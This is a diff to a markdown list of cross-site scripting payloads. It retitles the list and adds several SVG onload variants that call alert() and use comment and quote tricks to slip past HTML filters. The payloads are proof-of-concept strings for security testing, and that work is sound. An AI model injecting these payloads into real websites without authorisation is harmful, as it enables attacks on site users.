@@ -6,7 +6,7 @@
 
 
 # XSS
-- Personally created XSS payloads <br>
+- XSS payloads <br>
 
 <br>
 
@@ -28,6 +28,13 @@
 ""><svg/onload=alert(1)>%27/---+{{77}}"
 ;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
 ;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+<svg/onload=window.alert();//
+<!--><svg/onload=window.alert();//
 ```
 
 <br>
